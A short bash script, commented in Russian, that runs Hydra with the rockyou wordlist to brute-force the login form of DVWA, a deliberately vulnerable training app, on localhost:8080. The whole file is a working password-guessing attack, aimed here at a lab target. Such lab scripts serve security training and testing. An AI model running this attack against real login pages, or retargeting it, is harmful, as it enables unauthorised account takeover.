#!/bin/bash
# Имитация bruteforce через Hydra против DVWA login
# Запуск: bash run_hydra.sh

TARGET="localhost"
PORT=8080
USERLIST="admin"
PASSLIST="/usr/share/wordlists/rockyou.txt"

echo "=== Hydra: bruteforce на DVWA ==="
hydra -l "$USERLIST" \
    -P "$PASSLIST" \
    -s "$PORT" \
    "$TARGET" \
    http-get-form \
    "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
    -t 8 \
    -f \
    -vV

echo "=== Завершено ==="
